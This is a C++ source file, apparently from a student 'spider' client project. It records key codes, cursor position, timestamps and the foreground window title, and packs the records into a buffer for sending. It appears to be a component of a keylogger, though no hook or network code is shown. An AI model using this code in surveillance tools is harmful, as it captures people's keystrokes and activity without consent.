//
//	Created by hugo.baladssin@epitech.eu on 03/10/17
//

#include <Windows.h>
#include <ctime>
#include <list>
#include <vector>
#include "macros.h"
#include "Parser.h"

bool				spider::client::Parser::parseInput(t_input &input, uint8_t _key, const POINT &p, uint8_t _specialKey)
{
	std::time_t		timestamp = std::time(nullptr);

	if (timestamp == -1)
		return (false);
	input.posX = static_cast<int16_t>(p.x);
	input.posY = static_cast<int16_t>(p.y);
	input.timestamp = timestamp;
	input.inputCode = _key;
	input.specialKey = _specialKey;
	if (!getActiveWindowTitle(input.process))
		return false;
	return true;
}

bool				spider::client::Parser::getActiveWindowTitle(char title[32])
{
	HWND			hwnd;

	hwnd = GetForegroundWindow();
	if (!hwnd)
		return false;
	GetWindowText(hwnd, title, 32);
	return true;
}

std::vector<char>		spider::client::Parser::formatInputsForSending(std::vector<t_input> const &list)
{
	std::vector<char> data;
	int nb;
	char int_buffer[4];
	char input_buffer[sizeof(t_input)];

	std::memset(int_buffer, 0, 4);
	std::memset(input_buffer, 0, sizeof(t_input));
	nb = sizeof(t_input) * list.size();
	std::memcpy(int_buffer, &nb, 4);
	for (int i = 0; i < 4; i++)
		data.push_back(int_buffer[i]);
	nb = MAGIC_NUMBER;
	std::memcpy(int_buffer, &nb, 4);
	for (int i = 0; i < 4; i++)
		data.push_back(int_buffer[i]);
	for (auto &item : list)
	{
		std::memset(input_buffer, 0, sizeof(t_input));
		std::memcpy(input_buffer, &item, sizeof(t_input));
		for (int i = 0; i < sizeof(t_input); i++)
			data.push_back(input_buffer[i]);
	}
	return data;
}